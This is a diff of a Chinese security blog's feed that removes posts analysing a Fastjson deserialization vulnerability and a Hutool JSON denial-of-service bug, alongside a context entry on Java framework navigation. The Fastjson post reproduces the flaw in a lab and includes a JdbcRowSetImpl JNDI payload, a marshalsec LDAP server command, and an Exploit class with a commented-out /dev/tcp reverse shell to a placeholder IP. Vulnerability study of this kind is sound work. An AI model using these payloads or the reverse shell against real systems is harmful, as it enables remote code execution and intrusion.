-<p><img src="https://img-blog.csdnimg.cn/849debb381a6405992e49667e605122c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>这样我们就可以看到对象序列化之前对应的类，以及其中其中的可被序列化的methods与fields。 常规java序列化调用的是writeObject方法，反序列化则调用的是readObject方法，如果目标类在实现的时候重写了readObject方法想我们的demo代码一样，并包含有一些危险的操作的参数是用户可控的话，那么就可能导致反序列化漏洞。 ## Fastjson序列化与反序列化 Fastjson可以将JSONObject或者javaBean序列化为JSON字符串。关于javaBean的只是可以参考廖雪峰的网站：</p>
-<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">javaBean是什么</a></p>
-<p>Fastjson在对javaBean进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的set方法，我们可以看下面的代码，如果这个set方法中含有一些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令： 首先我们准备一个javaBean，FastjsonUnserilizeTest.java</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.armandhe.javabase;public class FastjsonUnserilizeTest &#123;    private String name;    private int age;    public String getName() &#123;        System.out.println(&quot;调用了getname方法！&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;调用了setname方法！&quot;);        this.name = name;    &#125;    public int getAge() &#123;        System.out.println(&quot;调用了getage方法！&quot;);        return age;    &#125;    public void setAge(int age) &#123;        System.out.println(&quot;调用了setage方法！&quot;);        this.age = age;    &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后是序列化与反序列化代码,FastjsonUnserilizeMain.java：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.armandhe.javabase;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.serializer.SerializerFeature;public class FastjsonUnserilizeMain &#123;    public static void main(String[] args) &#123;        //新建对象        System.out.println(&quot;新建对象：&quot;);        FastjsonUnserilizeTest fastjsonUnserilizeTest = new FastjsonUnserilizeTest();        fastjsonUnserilizeTest.setName(&quot;armband&quot;);        fastjsonUnserilizeTest.setAge(24);        //序列化        System.out.println(&quot;\n序列化：&quot;);        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);        System.out.println(s);        String jsonString = &quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;;        //反序列化        System.out.println(&quot;\n反序列化：&quot;);        FastjsonUnserilizeTest fastjsonUnserilizeTest1 = JSON.parseObject(s, FastjsonUnserilizeTest.class);        System.out.println(fastjsonUnserilizeTest1);        String name = fastjsonUnserilizeTest1.getName();        System.out.println(name);    &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>执行后控制控制台打印：</p>
-<p><img src="https://img-blog.csdnimg.cn/e765687c1e1446b7ac03b0de91b05763.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>第一部分是在我们新建对象的时候调用了两次set方法 第二部分是在序列化的时候调用了get方法 第三部分是在反序列化的时候调用了set方法 注意到Fastjson中序列化调用的是JSON.toJSONString方法，反序列化调用的是JSON.parseObject方法。</p>
-<h1 id="Fastjson发序列化漏洞原理"><a href="#Fastjson发序列化漏洞原理" class="headerlink" title="Fastjson发序列化漏洞原理"></a>Fastjson发序列化漏洞原理</h1><p>我们注意到在进行序列化操作的时候JSON.toJSONString方法有一个参数SerializerFeature.WriteClassName，这个参数就是在序列化是包含类名，也就是这个参数导致了Fastjson的反序列化漏洞，这个参数实现的功能在Fastjson中被称作AutoType，即自动类型。如果不添加这个参数我们的javaBean序列化后应该是这样的：</p>
-<p><img src="https://img-blog.csdnimg.cn/eb8629b5c130479db16ea78a72bae30f.png"></p>
-<p>对比一下包含有上述参数：</p>
-<p><img src="https://img-blog.csdnimg.cn/985e97bcda824b99b2e998f204ce68cd.png"></p>
-<p>可以看到多了一个@type参数。 如果没有SerializerFeature.WriteClassName参数，我们在进行反序列化时，代码这样写：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String s= &quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
-
-<p>这时候我们是不能控制到底要反序列化为什么类型的对象的，只能开发者在代码中指定好，如这样：</p>
-<p><img src="https://img-blog.csdnimg.cn/a7c0251edcff4126bf83411d163187aa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>而如果我们在序列化的时候添加了该参数，我们则可以在反序列化的时候通过控制@type键的值来控制该序列化数据要被反序列化为什么样的对象，即调用什么类的set 方法，接下来要用到的就是找到这样一个类可以被用来完成我们想要的功能。 其中一个类是：com.sun.rowset.JdbcRowSetImpl 我们查看以下这个类，定位到setDataSource方法：</p>
-<p><img src="https://img-blog.csdnimg.cn/1fa94087c6e04f1a84cebb3a6f394142.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>这段代码首先判断了this.getDataSourceName（）是否为空，我们定位到getDataSourceName（）方法处查看一下他的返回值：</p>
-<p><img src="https://img-blog.csdnimg.cn/89e36fc1c0614c2290f857cf77a43e64.png"></p>
-<p>返回dataSource，是一个字符串类型，那么我们在反序列化调用set方法时dataSource首先是没有值的，也就是说this.getDataSourceName（）的返回值为null，这逻辑进入到else部分，调用了父类的setDataSourceName，并将var1传了进去。其实这一串都不重要，只需要知道反序列化的时候会自动调用setDataSourceName为DataSourceName赋值就可以了。 再在com.sun.rowset.JdbcRowSetImpl类中定位到setAutocommit方法：</p>
-<p><img src="https://img-blog.csdnimg.cn/fbca0f32cedc450680f5b55e9d11101a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>在定位到this.connect方法：</p>
-<p><img src="https://img-blog.csdnimg.cn/d67bb450ac91440f8a388a8f533b5b9c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>在这里我们注意到有个lookup方法，该方法就是JNDI中访问远程服务器获取远程对象的方法，其参数为服务器地址。如果其参数可控那么就可能被攻击，而this.getDataSourceName是获取DataSourceName的值得方法，那么我们只要控制了this.setDataSourceName方法的参数就可以访问我们自己的服务器了。而我们知道Fastjson在反序列化的时候会调用所有的set方法，正好可以通过setDataSourceName对DataSourceName进行赋值。于是，我们就有了这样的Fastjson序列化数据：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/POC&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这儿autoCommit好像必须设置为true，为啥我忘记了，昨天看的，待会儿去找找！！ 漏洞的原理就是这样，接下来就是复现了，好紧张。。。。</p>
-<h1 id="一次失败的复现"><a href="#一次失败的复现" class="headerlink" title="一次失败的复现"></a>一次失败的复现</h1><p>我们利用现有的靶场环境：</p>
-<p><img src="https://img-blog.csdnimg.cn/89fa5bbcf94d4379afe17f7c27fdb35e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>将含有漏洞的war包直接放到tomcat的webapps目录下，然后启动tomcat就可以了，访问下：</p>
-<p><img src="https://img-blog.csdnimg.cn/8d3cb37607bd4836ad8c5149ddc1dd7b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>出啊先helloword则代表靶场搭建完毕，然后我们去看看这个war包怎么写的：</p>
-<p><img src="https://img-blog.csdnimg.cn/56db757d2dc34a6b828c14e2bff4ae8c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>这里有两个文件，主要的逻辑在过滤器那个类中，我直接给他粘出来：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.parser.Feature;import spark.Spark;import spark.servlet.SparkApplication;public class IndexFilter implements SparkApplication &#123;    public IndexFilter() &#123;    &#125;    public void init() &#123;        Spark.get(&quot;/&quot;, (req, res) -&gt; &#123;            return &quot;Hello World&quot;;        &#125;);        Spark.post(&quot;/&quot;, (request, response) -&gt; &#123;            String data = request.body();            JSONObject obj = JSON.parseObject(data, new Feature[]&#123;Feature.SupportNonPublicField&#125;);            JSONObject ret = new JSONObject();            ret.put(&quot;success&quot;, 200);            ret.put(&quot;data&quot;, &quot;Hello &quot; + obj.get(&quot;name&quot;) + &quot;, Your age is &quot; + obj.get(&quot;age&quot;));            response.status(200);            response.type(&quot;application/json&quot;);            return ret.toJSONString();        &#125;);    &#125;    public static void main(String[] args) &#123;        IndexFilter i = new IndexFilter();        i.init();    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看到，如果请求的方法为get则返回hello word ，如果为post则对传上来的数据进行反序列化操作，并输出 你的年纪与姓名这里面有一个</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Feature[]&#123;Feature.SupportNonPublicField&#125;);             JSONObject ret = new JSONObject();             ret.put(&quot;success&quot;, 200);</span><br></pre></td></tr></table></figure>
-
-<p>参数是为了让被private修饰的值也能被反序列化。 我们传入正常的数据： get请求：</p>
-<p><img src="https://img-blog.csdnimg.cn/a8524ed43bfb4d23999d84ca99143b64.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>post请求：</p>
-<p><img src="https://img-blog.csdnimg.cn/e0cd952100a249e2893f03439cd8508c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>然后传入我们构造的payload:</p>
-<p><img src="https://img-blog.csdnimg.cn/e229e0f363784fc2b3bf5b105e551930.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>在操作前记得先搭建好ldap服务器，使用的工具是marshalsec，可以在gihub上找到，命令是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1/#Exploit&quot; 6666</span><br></pre></td></tr></table></figure>
-
-<p>当靶机访问该服务器的时候，会被重定向到本机的80端口上访问Exploit.class文件，Exploit.java文件中的内容为：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;<span class="keyword">import</span> java.io.InputStream;<span class="keyword">import</span> java.io.InputStreamReader;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;);      <span class="comment">//Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);        InputStream is = p.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(is));        String line;        while((line = reader.readLine()) != null) &#123;            System.out.println(line);        &#125;        p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;    public static void main(String[] args) throws Exception &#123;    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>执行了打开计算机的命令，但我的操作并没有打开计算机，据说是应为jdk版本的原因。详情见： <a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a> 参考文章： <a href="https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">fastjson反序列化漏洞复现</a> <a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a></p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
-        <tag>网络安全</tag>
-        <tag>FashJSON</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</title>
-    <url>/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/</url>
-    <content><![CDATA[<h1 id="Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）"><a href="#Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）" class="headerlink" title="Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）"></a>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p><code>Hutool</code>是一个功能丰富且易用的<strong>Java工具库</strong>，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。</p>
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>CVE-2022-45690： 该项目受影响版本存在拒绝服务漏洞，由于org.json.JSONTokener.nextValue::JSONTokener.java组件中并未检验json的嵌套深度。攻击者可以通过构造特制的JSON或XML数据在程序解析时导致JVM溢出从而实现拒绝服务(DoS)攻击。</p>
-<p>CVE-2022-45689：该项目受影响版本存在拒绝服务漏洞，由于JSONObject.java中JSONObject方法对于要解析的json并未检验是否合法，在后续解析JSON时就会因为内存不足而造成拒绝服务漏洞。</p>
-<span id="more"></span>
-
-<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt; Hutool 5.8.11</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入<code>hutool</code>包</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811111844774.png" alt="image-20230811111844774"></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hutool-all-version</span>&gt;</span>5.7.22<span class="tag">&lt;/<span class="name">hutool-all-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;hutool-all-version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>编写测试类</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811112000265.png" alt="image-20230811112000265"></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;json_str&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONUtil.parseObj(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一般我们复现漏洞时都需要利用一些泄露的有关漏洞的信息，比如别人发的通告中未打码完全的截图、漏洞描述等信息，这里我们从阿里云漏洞库的描述中了解到该漏洞的大致情况：</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811112316260.png" alt="image-20230811112316260"></p>
-<p>里面有两个关键信息，一是嵌套深度、二是栈溢出，那这不妥妥的无线递归导致的栈溢出漏洞吗？先整2000层嵌套打一下试试：</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133440365.png" alt="image-20230811133440365"></p>
-<p>果然栈溢出了，打完收工，回家吹空调了。</p>
-<p>啥？你说这太简单了，你想学点硬货？行，那咱上硬货。</p>
-<p>这个漏洞分析第一步肯定时先把断点打起来，我们发现所谓的<code>parseObj</code>其实就是new了一个<code>JSONObject</code>对象。</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133657015.png" alt="image-20230811133657015"></p>
-<p>创建对象时会调用<code>init</code>方法，在该方法中会根据我们输入的参数类型选择不同的重载函数进行解析，我们输入的时个字符串，所以会进入到第680行的逻辑里。</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133906215.png" alt="image-20230811133906215"></p>
-<p>这里干的什么注释说的已经很清楚了</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134053659.png" alt="image-20230811134053659"></p>
-<p>这里有两个函数解释以下，首先时<code>nextClean</code>会去获取json字符串的token也就是<code>&quot; &#123; &#125; : [ ]</code>这一些，<code>nextValue</code>会去获取json字符串键对应的值。这个漏洞就出现在757行将json的键值对，往JSONObject对象里放的时候，在获取json值得时候会调用netValue函数。</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134202285.png" alt="image-20230811134202285"></p>
-<p>这个函数会根据从<code>:</code>后解析到得第一个token类型去调用不同得逻辑，当解析的token为<code>&#123;</code>时就会再new一个JSONObject对象。啊，这这这，这不就递归了吗？</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134541231.png" alt="image-20230811134541231"></p>
-<p>我们知道递归过程中函数会不断地压栈，而栈空间是有限地，如果不断地压栈而不弹栈地话就会导致栈溢出，所以需要一个基例来帮助函数解析到最深处能够回退，而在json字符串解析过程中就是当解析到最后一个<code>&#123;</code>时开始回退。但是这个json字符串地长度再这里我们若是可以控制地话，就可以先搞几万层嵌套让它一直压栈直到溢出为止，因为再分析过程中并没有看到代码中有对嵌套深度地限制。</p>
-<p>这个漏洞是栈溢出漏洞，而（CVE-2022-45689）确实一个实打实得堆溢出漏洞，一般来说堆溢出时非常少见得，应为JVM堆是非常大的，我们可以使用下面的代码答应一下一个普通的java程序运行时JVM可用的堆内存情况。</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811152225458.png" alt="image-20230811152225458"></p>
-<p>从结果来看JVM初始化时使用的总的堆内存为241MB，而可用的最到堆内存达到3GB，一般来说时很难发生溢出的。我们知道，JVM堆内存中一般存储的时java对象，要想要JVM堆发生溢出也就是说要有大量的没有被GC回收的对象占满了内存，但是如果只是单纯得常见对象，这些对象在沾满了幸存者0区后会被GC清除掉，一般也不会导致堆溢出，除非这些对象时不可清除得，那么什么情况下得对象时不可清除得呢。GC在进行垃圾回收时可以采用多种策略，其中包括引用计数法，即查看一个对象是否有被别得对象引用，如果没有则可以清除，如果有则不清除，但是这个算法有缺陷解决不了循环引用得问题，所以又有了可达性分析算法，及从一系列得GC Roots开始分析一个对象得可达性，如果这个对象不可达则进行清除。在这个例子中进行JSONObject解析递归到最深层进行返回时，每一个<code>&#123;xx:1&#125;</code>都将被new为一个新的<code>JSONObject</code>对象并被不断地引用嵌套，最终所有的<code>JSONObject</code>对象一起链接在一起占满了堆内存，我们可以使用jconsole来观察一下JVM的堆内存变化情况：</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811153435062.png" alt="image-20230811153435062"></p>
-<p>jconsole可能不太直观，可以下载<code>virtual VM</code>进行监控</p>
-<p>下载地址：<a href="https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip">https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip</a></p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811154033340.png" alt="image-20230811154033340"></p>
-<p>最开始我们的程序休眠了20秒（为了给jconsole链接提供时间）休眠结束后开始进行json字符串的解析，开始阶段应为还没有递归到最深处所以堆内存增加量不大，在递归达到最深处函数不断返回时，堆内存空间的消耗不断走高，最终耗尽内存资源导致堆溢出。我们把高峰期的堆内存dump出来</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811154905943.png" alt="image-20230811154905943"></p>
-<p>可以看到足足1.7G的内存都被我们的json字符串占据。</p>
-<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
-<li>升级软件到不受影响的版本或最新版，官方仓库地址：<a href="https://github.com/dromara/hutool/releases%E3%80%82">https://github.com/dromara/hutool/releases。</a></li>
-</ol>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582</a></li>
-<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-37582">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-37582</a></li>
-<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582</a></li>
-<li><a href="https://avd.aliyun.com/detail?id=AVD-2022-45689">https://avd.aliyun.com/detail?id=AVD-2022-45689</a></li>
-<li><a href="https://github.com/dromara/hutool/issues/2746">https://github.com/dromara/hutool/issues/2746</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>漏洞分析</tag>
-        <tag>漏洞</tag>
-        <tag>Hutool</tag>
-        <tag>JSONUtil拒绝服务漏洞</tag>
-        <tag>CVE-2022-45690</tag>
-        <tag>CVE-2022-45689</tag>
-        <tag>DoS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LDAP-轻量级目录访问协议</title>
-    <url>/2025/04/10/LDAP-%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<div class="pdfobject-container" data-target="/pdf/LDAP-轻量级目录访问协议.pdf" data-height="500px"></div>
-
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-        <category>安全技术</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>ldap</tag>
-        <tag>漏洞原理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JAVA生态常见架构介绍、配置与逻辑定位方法</title>
     <url>/2025/04/10/JAVA%E7%94%9F%E6%80%81%E5%B8%B8%E8%A7%81%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E9%80%BB%E8%BE%91%E5%AE%9A%E4%BD%8D%E6%96%B9%E6%B3%95/</url>
     <content><![CDATA[<p>不知道你在挖洞过程中是否碰到过这样一个问题，资源下载到了，调试环境也搞定了却迟迟找不到合适的地方下断点进行调试，这时候你会选择怎么办？<br>是去寻找启动类一行一行代码查看直到找到URI的处理函数，还是快准狠地定位到关键点马上出洞？我想不会有人想要选择第一种方法，<br>但按照第一种方法不断地熟悉不同的框架的过程却是一个挖洞小白向大佬进化的过程，我们往往需要在这个过程中不断地积累足够的经验来熟悉常见的技术与框架，<br>这几乎是每一个大佬成长路上必须要走的路。毫无疑问，这种曲折的过程最能增长人们的能力，不过这个过程往往是痛苦且枯燥的，在挖洞过程中，时间紧任务重的情况下，<br>我们往往在这个过程中浪费了大量的时间与精力，所以我给大家简单总结了一下我们应该如何去找到一些常见框架进行资源处理与存放、配置存放与解析规则的方法。</p>
@@ -411,142 +325,19 @@
       </tags>
   </entry>
   <entry>
-    <title>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</title>
-    <url>/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/</url>
